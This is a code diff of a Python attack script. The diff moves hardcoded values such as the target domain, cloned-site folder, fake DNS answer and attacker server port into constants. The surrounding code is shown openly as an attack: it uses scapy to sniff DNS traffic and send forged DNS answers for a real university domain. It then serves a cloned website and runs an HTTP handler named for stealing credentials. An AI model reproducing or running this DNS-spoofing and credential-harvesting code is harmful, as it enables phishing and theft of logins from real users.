@@ -5,14 +5,9 @@ from urllib.parse import urljoin, urlparse, parse_qs
 from http.server import SimpleHTTPRequestHandler, HTTPServer, BaseHTTPRequestHandler
 import socketserver
 from threading import Thread
-from scapy.all import *
-from constants import ATTACKER_IP
+from scapy.all import DNS, DNSRR, DNSQR, IP, UDP, Ether, sendp, sniff
+from constants import ATTACKER_IP, TARGET_DOMAIN, CLONED_SITE_DIR, FAKE_ANSWER, C2_SERVER_PORT
 
-
-target_domain = "fs.singaporetech.edu.sg"
-cloned_site_dir = "cloned_site"
-attacker_server_port = 8080
-fake_answer = "PDCSRV.ICT.SIAT.EDU.SG"
 
 # Global variable to stop DNS spoofing
 stop_sniffing = False
@@ -38,11 +33,11 @@ def dns_spoof(pkt):
                           IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                           UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
-                              an=DNSRR(rrname=pkt[DNS].qd.qname, type="PTR", ttl=10, rdata=fake_answer))
+                              an=DNSRR(rrname=pkt[DNS].qd.qname, type="PTR", ttl=10, rdata=FAKE_ANSWER))
             sendp(spoofed_pkt, verbose=0)
             print(f"Sent spoofed reverse DNS response to {pkt[IP].src}")
-        elif target_domain in pkt[DNS].qd.qname.decode():
-            print(f"Spoofing DNS request for {target_domain}")
+        elif TARGET_DOMAIN in pkt[DNS].qd.qname.decode():
+            print(f"Spoofing DNS request for {TARGET_DOMAIN}")
             # Construct the DNS response
             spoofed_pkt = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / \
                           IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
@@ -84,14 +79,14 @@ class StealCredentialsHandler(BaseHTTPRequestHandler):
 
 # Start the attacker's server
 def start_attacker_server():
-    server_address = ('', attacker_server_port)
+    server_address = ('', C2_SERVER_PORT)
     httpd = HTTPServer(server_address, StealCredentialsHandler)
-    print(f"Attacker server running on port {attacker_server_port}")
+    print(f"Attacker server running on port {C2_SERVER_PORT}")
     httpd.serve_forever()
 
 
 # Start the web server in a separate thread
-web_server_thread = Thread(target=start_web_server, args=(80, cloned_site_dir))
+web_server_thread = Thread(target=start_web_server, args=(80, CLONED_SITE_DIR))
 web_server_thread.start()
 
 # Start the attacker's server in a separate thread
